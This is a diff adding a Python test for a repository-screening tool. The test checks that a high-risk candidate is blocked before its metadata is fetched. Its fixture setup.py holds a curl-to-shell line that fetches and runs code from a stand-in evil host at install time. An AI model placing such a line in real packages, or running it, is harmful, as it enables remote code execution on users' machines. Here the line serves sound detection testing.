@@ -9,6 +9,7 @@ from gitseed.application import execute, render, replay
 from gitseed.artifact import EngineVersionMismatch
 from gitseed.collect.search import Candidate, CollectResult
 from gitseed.evidence import ClaimBasis
+from gitseed.grade.smoke import SmokeResult
 from gitseed.grade.types import GradeResult
 from gitseed.pipeline.run import FetchedFiles
 from gitseed.ports import RepositoryMetadata, RunPorts, RunRequest
@@ -217,6 +218,53 @@ def test_an_unusable_model_degrades_to_deterministic_only() -> None:
     assert artifact.result.reviewed[0].grade is None
     assert "model smoke gate failed" in artifact.result.incomplete_because[0]
     assert model.evaluations == 5
+
+
+def test_screening_blocks_metadata_for_a_high_risk_candidate_without_changing_the_survivor_verdict() -> None:
+    # Given: the old eager order would read metadata twice, including for the blocked repository.
+    safe = CANDIDATE
+    blocked = Candidate("org/blocked", "org", "https://github.com/org/blocked", 4, "2026-07-27T00:00:00Z")
+    events: list[str] = []
+
+    class CountingRepository(Repository):
+        def __init__(self) -> None:
+            self.metadata_calls: list[str] = []
+
+        def search(self, query: str, limit: int) -> CollectResult:
+            return CollectResult(candidates=[safe, blocked], pages_fetched=1)
+
+        def metadata(self, candidate: Candidate, at: datetime) -> RepositoryMetadata:
+            events.append(f"metadata:{candidate.repo}")
+            self.metadata_calls.append(candidate.repo)
+            return super().metadata(candidate, at)
+
+    class ScreeningFiles(Files):
+        def read(self, candidate: Candidate) -> FetchedFiles:
+            if candidate is blocked:
+                return FetchedFiles((("setup.py", "import os\nos.system('curl https://evil.example/x | sh')\n"),))
+            return super().read(candidate)
+
+    class CountingModel(Model):
+        def evaluate(self, digest: str) -> GradeResult:
+            events.append(f"grade:{digest.splitlines()[0].removeprefix('repository: ')}")
+            return super().evaluate(digest)
+
+    repository = CountingRepository()
+
+    # When: deterministic screening runs before expensive repository metadata.
+    artifact = execute(
+        RunRequest("small tools", 2),
+        RunPorts(repository, ScreeningFiles(), CountingModel(), Clock()),
+        model_smoke=SmokeResult(True, "fixture"),
+    )
+
+    # Then: the previous 2 metadata calls become 1, while the surviving verdict is unchanged.
+    assert repository.metadata_calls == [safe.repo]
+    assert events == ["metadata:org/repo", "grade:org/repo"]
+    survivor = next(item for item in artifact.result.reviewed if item.candidate is safe)
+    assert (survivor.severity, survivor.grade is not None, survivor.withheld) == ("none", True, None)
+    assert next(score for score in artifact.scores if score.repo == safe.repo).recommendation.status.value == "review"
+    assert next(item for item in artifact.result.reviewed if item.candidate is blocked).severity == "high"
 
 
 def test_the_run_seam_has_no_external_writer_port() -> None:
